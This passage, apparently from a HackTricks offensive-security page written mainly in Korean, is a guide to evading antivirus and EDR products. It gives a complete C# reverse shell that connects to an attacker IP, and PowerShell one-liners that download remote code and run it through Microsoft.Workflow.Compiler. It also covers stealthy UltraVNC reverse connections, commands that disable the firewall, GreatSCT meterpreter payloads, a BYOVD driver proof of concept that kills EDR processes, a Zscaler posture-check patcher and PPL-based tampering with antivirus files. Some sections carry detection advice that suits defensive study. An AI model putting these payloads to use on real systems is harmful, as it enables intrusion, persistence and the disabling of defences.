Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
다음은 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 페이로드를 ISO 파일 안에 패키징하여 SmartScreen을 우회하는 데모입니다

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 Windows에서 애플리케이션 및 시스템 구성 요소가 **이벤트를 기록**할 수 있게 해주는 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 이벤트를 기록하지 않고 즉시 반환하게 만들 수도 있습니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하도록 만들어 해당 프로세스의 ETW 로깅을 사실상 비활성화하는 방식으로 수행됩니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 것은 꽤 오래전부터 알려져 왔으며, 여전히 AV에 탐지되지 않고 포스트 익스플로잇 도구를 실행하는 매우 좋은 방법입니다.

페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 전체 프로세스에 대해 AMSI 패치만 신경 쓰면 됩니다.

대부분의 C2 프레임워크 (sliver, Covenant, metasploit, CobaltStrike, Havoc, 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 수행하는 여러 방법이 있습니다:

- **Fork\&Run**

이는 **새로운 희생 프로세스를 생성**하고 그 새 프로세스에 포스트 익스플로잇 악성 코드를 인젝션하여 실행한 뒤 완료되면 해당 프로세스를 종료하는 방식입니다. 장단점이 있습니다. fork and run 방식의 이점은 실행이 우리 Beacon 임플란트 프로세스의 **외부**에서 발생한다는 점입니다. 즉, 포스트 익스플로잇 작업 중 문제가 생기거나 탐지되더라도 우리 **임플란트가 살아남을** 가능성이 **훨씬 더 큽니다.** 단점은 Behavioural Detections에 의해 발각될 **가능성이 더 크다**는 것입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에** 인젝션하는 방식입니다. 이렇게 하면 새 프로세스를 생성하여 AV에 스캔되게 하는 것을 피할 수 있지만, 페이로드 실행 중 문제가 발생하면 프로세스가 크래시할 수 있어 **beacon을 잃을** **가능성이 훨씬 더 큽니다.**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)와 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인하세요.

또한 C# 어셈블리를 **PowerShell에서** 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), 취약한 시스템이 **공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 대한 접근**을 가지도록 하면 다른 언어를 사용해 악성 코드를 실행할 수 있습니다.

SMB 공유에서 인터프리터 바이너리와 환경에 대한 접근을 허용함으로써 취약한 머신의 메모리 내에서 이러한 언어들로 **임의의 코드를 실행할 수 있습니다.**

해당 리포는 다음과 같이 언급합니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 유연성**이 더 생깁니다. 이러한 언어들로 작성된 랜덤한 난독화되지 않은 리버스 셸 스크립트로 테스트한 결과 성공을 거두었습니다.

## TokenStomping

Token stomping은 공격자가 **액세스 토큰이나 EDR 또는 AV 같은 보안 제품을 조작**할 수 있게 하는 기법으로, 프로세스가 종료되지 않도록 권한을 낮추되 악성 활동을 검사할 권한은 없게 만듭니다.

이를 방지하기 위해 Windows는 보안 프로세스의 토큰에 대해 **외부 프로세스가** 핸들을 얻는 것을 차단할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

이 블로그 포스트([**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide))에 설명된 바와 같이, 피해자 PC에 Chrome Remote Desktop을 배포한 뒤 이를 통해 탈취하고 지속성을 유지하는 것은 쉽습니다:
1. https://remotedesktop.google.com/에서 다운로드하고, "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 MSI 파일을 다운로드합니다.
2. 피해자 시스템에서 설치 프로그램을 무음으로 실행합니다(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 Next를 클릭합니다. 마법사가 권한 부여를 요청하면 Authorize 버튼을 클릭하여 계속합니다.
4. 일부 매개변수를 조정하여 다음 명령을 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (참고: --pin 매개변수는 GUI를 사용하지 않고 PIN을 설정할 수 있게 해줍니다.)

## Advanced Evasion

Evasion은 매우 복잡한 주제로, 하나의 시스템에서 여러 서로 다른 텔레메트리 소스를 고려해야 할 때가 많기 때문에 성숙한 환경에서 완전히 탐지를 피하는 것은 사실상 불가능합니다.

대응하는 각 환경은 고유한 강점과 약점을 가지고 있습니다.

더 고급 회피 기법에 대해 발판을 마련하려면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

이것은 또한 Evasion in Depth에 관한 [@mariuszbit](https://twitter.com/mariuszbit)의 또 다른 훌륭한 강연입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **오래된 기법**

### **Defender가 악성으로 판단하는 부분 확인하기**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 **바이너리의 일부를 제거**하여 **Defender가 어떤 부분을 악성으로 판단하는지** 찾아내어 해당 부분을 분리해 줍니다.\
동일한 기능을 제공하는 또 다른 도구로는 [**avred**](https://github.com/dobin/avred)가 있으며 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 웹으로 제공됩니다.

### **Telnet Server**

Windows10 이전에는 모든 Windows에 (관리자로) 설치할 수 있는 **Telnet server**가 포함되어 있었습니다. 설치하려면 다음을 실행하세요:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템 시작 시 **시작**되도록 만들고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin downloads를 사용하세요, setup은 사용하지 마세요)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** To maintain stealth you must not do a few things

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 **리스너를 시작**하려면 `msfconsole -r file.rc`를 사용하고, 다음으로 **xml payload**를 **실행**합니다:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 자체 reverse shell 컴파일

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 추가

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 무력화

Storm-2603는 랜섬웨어를 내려놓기 전에 엔드포인트 보호를 비활성화하기 위해 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 활용했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버**를 포함하여 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 특권 커널 작업을 수행합니다.

핵심 요점
1. **서명된 드라이버**: 디스크에 배달된 파일은 `ServiceMouse.sys`지만, 실제 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정당하게 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화된 상태에서도 로드됩니다.
2. **서비스 설치**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 유저랜드에서 접근 가능하도록 만듭니다.
3. **드라이버가 노출하는 IOCTL**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의 프로세스를 종료 (Defender/EDR 서비스 종료에 사용) |
| `0x990000D0` | 디스크에 있는 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **작동 원리**: BYOVD는 유저모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *보호된* 프로세스를 열거나 종료하고 PPL/PP, ELAM 또는 기타 하드닝 기능에 상관없이 커널 객체를 조작할 수 있습니다.

Detection / Mitigation
•  Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`를 로드하지 못하도록 합니다.  
•  새로운 *커널* 서비스 생성 모니터링을 수행하고 드라이버가 전 세계 쓰기 가능한 디렉터리에서 로드되거나 허용 목록에 없는 경우 경고를 발생시킵니다.  
•  사용자 모드에서 커스텀 디바이스 객체에 대한 핸들이 생성된 후 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소에 전달하기 위해 Windows RPC를 사용합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가는 **전적으로 클라이언트 측에서** 이루어집니다(서버로는 boolean 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **Zscaler에 의해 서명되었는지**(`WinVerifyTrust`를 통해)만 검증합니다.

디스크 상의 서명된 4개 바이너리를 패치함으로써 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하도록 변경되어 모든 검사에서 compliant로 처리됨 |
| `ZSAService.exe` | `WinVerifyTrust`에 대한 간접 호출 | NOP 처리 ⇒ 어떤 프로세스(심지어 서명되지 않은 것)도 RPC 파이프에 바인딩 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 단락 처리되어 우회됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일들을 교체하고 서비스 스택을 재시작한 후:

* **모든** posture 검사들이 **green/compliant** 상태로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 named-pipe RPC 엔드포인트를 열 수 있습니다(예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 침해된 호스트는 Zscaler 정책에 정의된 내부 네트워크에 무제한으로 접근합니다.

이 사례 연구는 순수히 클라이언트 측 신뢰 판단과 단순한 서명 검사들이 몇 바이트 패치만으로 어떻게 무력화될 수 있는지를 보여줍니다.

## Protected Process Light (PPL)을 악용해 LOLBINs로 AV/EDR를 변조하기

Protected Process Light (PPL)는 서명자/레벨 계층을 강제하여 동일하거나 더 높은 수준의 protected 프로세스만 서로 변조할 수 있도록 합니다. 공격적으로, 합법적으로 PPL 지원 바이너리를 실행하고 그 인자를 제어할 수 있다면, 정상적인 기능(예: 로깅)을 AV/EDR에서 사용하는 보호된 디렉터리에 대한 제약된, PPL 기반의 write primitive로 바꿀 수 있습니다.

프로세스가 PPL로 실행되게 하는 요소
- 대상 EXE(및 로드된 DLL)는 PPL 지원 EKU로 서명되어야 합니다.
- 프로세스는 CreateProcess로 생성되어야 하며 플래그로 `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`를 사용해야 합니다.
- 바이너리의 서명자와 일치하는 호환 가능한 protection level을 요청해야 합니다(예: 안티멀웨어 서명자에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨은 생성 시 실패합니다.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 프리미티브: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체 실행되며 호출자가 지정한 경로에 로그 파일을 쓰는 매개변수를 허용합니다.
- PPL 프로세스로 실행되면 파일 쓰기는 PPL로 보호된 권한으로 수행됩니다.
- ClipUp은 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호된 위치를 가리킬 때 8.3 단축 경로를 사용하세요.

8.3 단축 경로 도움말
- 단축 이름 나열: 각 상위 디렉터리에서 `dir /x`
- cmd에서 단축 경로 도출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 런처(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 PPL 지원 LOLBIN(ClipUp)을 실행합니다.
2) ClipUp의 로그-경로 인수를 전달하여 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성을 강제합니다. 필요하면 8.3 단축 이름을 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 일반적으로 열려 있거나 잠겨 있다면(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 수행되도록 더 먼저 실행되는 자동 시작 서비스를 설치하세요. Process Monitor(부팅 로깅)로 부팅 순서를 검증합니다.
4) 재부팅 시 PPL로 보호된 쓰기는 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 쓰는 내용은 위치(placement) 외에는 제어할 수 없습니다; 이 primitive는 정밀한 내용 주입보다는 손상(corruption)에 적합합니다.
- 서비스 설치/시작 및 재부팅 시간을 위해 로컬 admin/SYSTEM 권한이 필요합니다.
- 타이밍이 중요합니다: 대상이 열려 있으면 안 되며, 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

Detections
- 부팅 시점에 비표준 런처(parented by non-standard launchers)로부터 상속된 경우를 포함해, 특이한 인수로 `ClipUp.exe` 프로세스 생성.
- 의심스러운 바이너리를 자동 시작하도록 구성된 새로운 서비스 및 Defender/AV보다 항상 먼저 시작되는 경우. Defender 시작 실패 이전의 서비스 생성/수정 내역을 조사하세요.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예기치 않은 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 비-AV 바이너리의 비정상적인 PPL 레벨 사용을 확인하세요.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 어떤 부모 프로세스 하에서 PPL로 실행될 수 있는지 제한; 정당한 컨텍스트 외에서의 ClipUp 호출 차단.
- 서비스 위생: 자동 시작 서비스의 생성/수정 권한을 제한하고 시작 순서 조작을 모니터링하세요.
- Defender tamper protection 및 early-launch protections가 활성화되어 있는지 확인하고, 바이너리 손상을 나타내는 시작 오류를 조사하세요.
- 보안 툴이 위치한 볼륨에서 8.3 short-name generation을 환경 호환성이 허용한다면 비활성화하는 것을 고려하세요(철저히 테스트할 것).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
